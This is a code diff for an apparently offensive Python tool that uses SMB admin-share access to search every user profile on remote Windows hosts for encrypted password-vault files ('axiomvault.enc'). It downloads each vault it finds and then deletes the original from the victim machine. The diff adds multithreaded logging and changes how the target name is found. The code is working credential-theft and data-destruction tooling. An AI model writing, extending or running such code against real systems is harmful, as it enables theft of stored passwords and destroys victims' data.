@@ -3,29 +3,31 @@
 from axiom_keepass.core.parse_args import AxiomArgParser
 from axiom_keepass.client.download import download
 
-def pull(smbClient, silent=False):
+def pull(smbClient, thread_index, silent=False):
     users_folder = smbClient.listPath("C$", r"\Users\*")
     for f in users_folder:
         if f.is_directory() and f.get_longname() != "." and f.get_longname() != "..":
             if not silent:
-                print(f"[+] Searching in {f.get_longname()}")
+                print(f"[THREAD {thread_index}][*] Searching in {f.get_longname()}")
 
             try:
-                target = AxiomArgParser.GetProgramArgs().target.split('@')[1]
+                target = smbClient.getRemoteHost()
                 result = smbClient.listPath("C$", f"\\Users\\{f.get_longname()}\\AppData\\Roaming\\axiomvault.enc")
                 if result is not None:
-                    print(f"[+] Found a vault! File size is {result[0].get_filesize()} bytes")
+                    print(f"[THREAD {thread_index}][+] Found a vault! File size is {result[0].get_filesize()} bytes")
                     download(
-                            smbClient,
-                            f"\\Users\\{f.get_longname()}\\AppData\\Roaming\\axiomvault.enc",
-                            f"./{target}_{f.get_longname()}_axiomvault.enc"
+                        smbClient,
+                        thread_index,
+                        f"\\Users\\{f.get_longname()}\\AppData\\Roaming\\axiomvault.enc",
+                        f"./{target}_{f.get_longname()}_axiomvault.enc",
+                        silent=False
                     )
                     
                     try:
                         smbClient.deleteFile("C$", f"\\Users\\{f.get_longname()}\\AppData\\Roaming\\axiomvault.enc")
-                        print(f"[+] Vault deleted from {target}")
+                        print(f"[THREAD {thread_index}][+] Vault deleted from {target}")
                     except:
-                        print(f"[-] Failed to delete the vault from {target}, remember to do it manually")
+                        print(f"[THREAD {thread_index}][-] Failed to delete the vault from {target}, remember to do it manually")
 
             except Exception as e:
                 if "STATUS_STOPPED_ON_SYMLINK" in str(e):
@@ -35,5 +37,5 @@ def pull(smbClient, silent=False):
                 elif "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                     continue
                 else:
-                    print(f"[-] {str(e)}")
+                    print(f"[THREAD {thread_index}][-] {str(e)}")
 
